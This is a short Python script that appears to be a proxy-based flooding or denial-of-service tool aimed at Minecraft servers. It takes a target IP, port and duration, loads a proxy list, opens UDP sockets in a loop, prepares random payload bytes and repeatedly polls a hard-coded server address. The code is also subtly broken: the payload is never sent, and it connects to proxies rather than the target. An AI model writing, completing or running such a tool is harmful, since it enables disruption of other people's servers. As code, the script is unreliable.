import socket
import time
import threading
import random
import sys
import os
import requests
import mcstatus
from mcstatus import MinecraftServer
import colorama
from colorama import *

os.system("cls || clear")

def main():
    global ip
    global port
    global tiempo
    global lista
    global s
    ip = sys.argv[1]
    port = int(sys.argv[2])
    tiempo = int(sys.argv[3])
    lista = 'proxy.txt'
    thr = 400
    pprr = open(lista).readlines()
    atk()

def atk():
    reloj=(lambda:0,time.clock)[tiempo>0]
    duracion=(1,(reloj()+tiempo))[tiempo>0]
    bytes = random._urandom(5000)
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        pprr = open(lista).readlines()
        server = MinecraftServer.lookup("144.217.10.200:25565")
        status = server.status()
        if reloj()<duracion:
            proxy = random.choice(pprr).split(":")
            s.connect((str(proxy[0]), int(proxy[1])))
            print("{}".format(status.description))
            print(Fore.CYAN + "Nueva conexion desde " + Fore.WHITE + str(proxy[0]) + ":" + str(proxy[1]))
        else:
            exit()


main()
